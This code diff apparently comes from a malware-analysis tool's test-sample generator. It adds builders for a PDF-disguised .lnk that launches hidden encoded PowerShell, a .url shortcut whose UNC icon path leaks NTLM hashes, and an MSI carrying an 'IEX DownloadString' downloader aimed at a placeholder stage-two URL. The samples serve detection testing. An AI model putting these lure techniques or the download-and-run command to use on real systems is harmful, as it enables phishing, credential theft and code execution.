@@ -642,9 +642,77 @@ def loader_hta() -> bytes:
     return body.encode()
 
 
+def shortcut_lnk() -> bytes:
+    """A .lnk disguised as a PDF (double extension) whose target is cmd.exe
+    launching a hidden, Base64-encoded PowerShell stage — the classic LNK lure.
+    Exercises LnkParse3 parsing, the LOLBin/hidden-window/double-extension rules
+    and the command → scripting-engine path. All indicators inert."""
+    import tempfile
+
+    import pylnk3
+
+    with tempfile.NamedTemporaryFile(suffix=".lnk", delete=False) as tmp:
+        name = tmp.name
+    try:
+        pylnk3.for_file(
+            r"C:\Windows\System32\cmd.exe",
+            lnk_name=name,
+            arguments=f"/c powershell -nop -w hidden -enc {PS_B64}",
+            description=f"Factura {INVOICE}",
+            work_dir=r"C:\Users\Public",
+            icon_file=r"C:\Program Files\Adobe\Acrobat\Acrobat.exe", icon_index=0)
+        return Path(name).read_bytes()
+    finally:
+        Path(name).unlink(missing_ok=True)
+
+
+def internet_shortcut_url() -> bytes:
+    """A .url (Internet Shortcut) pointing at a remote script payload, with its
+    IconFile on a UNC path (SMB/NTLM hash leak, CVE-2024-21412 style). Inert INI
+    text; exercises the .url parser and its remote-file / UNC-icon / exec rules."""
+    body = (
+        "[InternetShortcut]\r\n"
+        f"URL=file://{C2_IP}/share/factura_{INVOICE}.exe\r\n"
+        f"IconFile=\\\\{C2_IP}\\share\\icon.ico\r\n"
+        "IconIndex=0\r\n"
+        "[InternetShortcut.A]\r\n"
+        "IDList=\r\n"
+    )
+    return body.encode()
+
+
+def installer_msi() -> bytes:
+    """A minimal .msi (OLE/CFB) with a CustomAction + InstallExecuteSequence +
+    Binary table and a _StringData pool carrying a PowerShell downloader and an
+    embedded Binary stream (inert MZ stub). Exercises the MSI stream-name decode,
+    the dangerous-table rules, the string mining → scripting engine and the
+    embedded-binary rule. Built with the shared CFB writer (no Windows needed)."""
+    sys.path.insert(0, str(ROOT / "scripts"))
+    from cfb import build_cfb
+
+    sys.path.insert(0, str(ROOT))
+    from docutracex.parsers.msi import encode_streamname as enc
+
+    strdata = (
+        b"CustomActionData\x00"
+        + f"powershell -NoProfile -w hidden -Command IEX(New-Object Net.WebClient)."
+          f"DownloadString('{STAGE2_URL}')".encode()
+        + b"\x00RunStage\x00Binary\x00"
+        + f"{STAGE2_URL}\x00".encode()
+    )
+    tree = {
+        enc("CustomAction", True): b"\x00" * 8,
+        enc("InstallExecuteSequence", True): b"\x00" * 8,
+        enc("Binary", True): b"\x00" * 8,
+        enc("_StringData", False): strdata,
+        enc("Binary.stage", False): MZ_STUB,
+    }
+    return build_cfb(tree)
+
+
 def dropper_bundle_zip() -> bytes:
-    """A plain .zip bundling the obfuscated scripts, to exercise the nested
-    (recursive) deobfuscation path: each child is deobfuscated on its own."""
+    """A plain .zip bundling the obfuscated scripts and shortcuts, to exercise the
+    nested (recursive) path: each child is parsed/deobfuscated on its own."""
     import io
     import zipfile
 
@@ -656,6 +724,9 @@ def dropper_bundle_zip() -> bytes:
         zf.writestr("factura.pdf.vbs", dropper_vbs())
         zf.writestr("instalador.bat", dropper_bat())
         zf.writestr("factura.hta", loader_hta())
+        zf.writestr("factura.pdf.lnk", shortcut_lnk())
+        zf.writestr("factura.url", internet_shortcut_url())
+        zf.writestr("instalador.msi", installer_msi())
     return buf.getvalue()
 
 
@@ -670,6 +741,8 @@ def build_all() -> dict[str, bytes]:
         "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
         "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
         "sample_dropper.bat": dropper_bat(), "sample_loader.hta": loader_hta(),
+        "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
+        "sample_installer.msi": installer_msi(),
         "lab/dropper_bundle.zip": dropper_bundle_zip(),
     }
     for ext in X_CT:
